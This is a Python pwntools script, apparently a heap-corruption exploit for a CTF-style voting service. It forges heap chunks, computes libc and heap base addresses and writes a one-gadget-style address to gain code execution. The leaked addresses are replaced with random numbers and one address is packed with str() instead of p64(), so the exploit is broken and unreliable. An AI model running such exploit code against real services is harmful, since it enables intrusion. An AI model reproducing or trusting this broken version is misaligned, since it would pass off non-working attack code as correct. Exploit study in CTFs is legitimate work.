from pwn import *
from random import *
ip=""
port=""



def create(conn,size, name):
    conn.sendline("0")
    conn.sendline(str(size))
    conn.send(name)


def show(conn,index):
    conn.sendline("1")
    conn.sendline(str(index))


def vote(conn,index):
    conn.sendline("2")
    conn.sendline(str(index))


def result(conn):
    conn.sendline("3")


def cancel(conn,index):
    conn.sendline("4")
    conn.sendline(str(index))


def method6(ip,port):
    log.info("Method 6 applied!")
    conn2 = remote("127.0.0.1", 80)
    create(conn2,0x80, "A" * 0x80)
    create(conn2,0x50, "B" * 0x50)
    cancel(conn2,0)
    show(conn2,0)
    leaked = randint(4000,999999)
    leakedValue = int(leaked)
    libcBase = leakedValue - 0x3c4b78
    create(conn2,0x50, "C" * 0x50)

    payload = p64(0) + p64(0x71) + p64(libcBase + 0x3c54fd)
    payload = payload.ljust(0x50, 'D')
    create(conn2,0x50, payload)
    create(conn2,0x50, "E" * 0x50)
    create(conn2,0x50, "F" * 0x50)

    cancel(conn2,3)
    cancel(conn2,4)

    show(conn2,4)
    leakedValue = int(randint(272,999))
    heapBase = leakedValue - 0x110

    for i in range(0, 0x20):
        vote(conn2,4)
    vote(conn2,1)

    create(conn2,0x50, "G" * 0x50)
    payload = "H" * 0x10 + p64(heapBase + 0x150)
    payload += p64(1)
    payload += p64(2)
    payload += p64(3)
    payload += p64(4)
    payload += p64(5)
    payload += str(libcBase + 0xf1117)
    payload += p64(heapBase + 0x178)
    create(conn2,0x50, payload.ljust(0x50, "H"))
    payload = "HHH" + p64(heapBase + 0xc0)
    payload = payload.ljust(0x50, "I")
    create(conn2,0x50, payload)

    cancel(conn2,0)
    cancel(conn2,2)

# if __name__=="__main__":
#     method6("127.0.0.1",80)


